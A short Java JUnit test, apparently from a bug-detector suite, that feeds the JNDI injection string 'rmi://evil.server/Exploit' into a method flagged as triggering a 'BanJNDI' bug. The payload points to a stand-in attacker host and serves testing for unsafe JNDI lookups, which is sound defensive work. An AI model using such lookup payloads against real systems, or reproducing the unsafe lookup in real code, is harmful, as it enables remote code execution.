import org.junit.Test;
import static org.junit.Assert.*;
import javax.naming.NamingException;

public class BanJNDIBugTest {

    @Test
    public void testShowBug() throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        bug.showBug(userInput); // TRIGGER BUG: BanJNDI
        fail("Expected NamingException to be thrown");
    }
}